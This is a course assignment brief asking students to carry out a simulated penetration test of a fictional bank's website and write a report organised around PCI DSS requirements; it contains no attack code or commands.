ACCE Pentest Assignment
Due December 31, 2023 11:59 PM
Instructions
Objective: 
Implement learned penetration testing techniques on a simulated environment in compliance with Payment Card Industry Data Security Standard (PCI DSS), analyze the results, and create a comprehensive penetration test report following the PCI DSS requirements.

Subsequently, analyze the results and compile them into a comprehensive, Microsoft Word document report adhering to the PCI DSS guideline.

Details:

For this assignment, you will step into the role of a cybersecurity consultant hired by a hypothetical company, "Juggy Bank Corporation." Your assignment is to conduct a penetration test on their simulated website system (accessible at http://juggybank.com/ ), complying with the PCI DSS requirements.

The tasks for your assignment include:

Penetration Test Planning and Execution: Plan and perform the penetration testing process according to PCI DSS Requirement 11.3. Your plan should detail each testing procedure's objectives, and take meticulous notes of your actions, observations, and preliminary findings.

Tool Selection and Utilization: Employ appropriate penetration testing tools. Document why and how you used these tools, and ensure the tools comply with PCI DSS Requirement 6.2.


Target Identification: Identify and document the system components potentially impacted by discovered vulnerabilities, adhering to PCI DSS Requirement 6.5.


Vulnerability Referencing: Reference the identified vulnerabilities to known issues, using databases like CVE, CWE, BID, OSVDB, etc. as per PCI DSS Requirement 6.1.


Detailed Reporting of Findings: Describe each finding in detail, indicating how it was discovered, its potential impact, and underlying cause, in alignment with PCI DSS Requirement 11.3.4.


Countermeasure Proposals: Propose countermeasures to alleviate each identified vulnerability. Your recommendations should align with the PCI DSS Requirements (especially Requirement 6.5) and include feasible, cost-effective solutions in line with industry best practices.

To guide your report's format and content, refer to section 5.2.1 'Penetration Test Report Outline' on page 19 of the attached guidelines, and ensure your report aligns with PCI DSS Requirement 11.3.4.
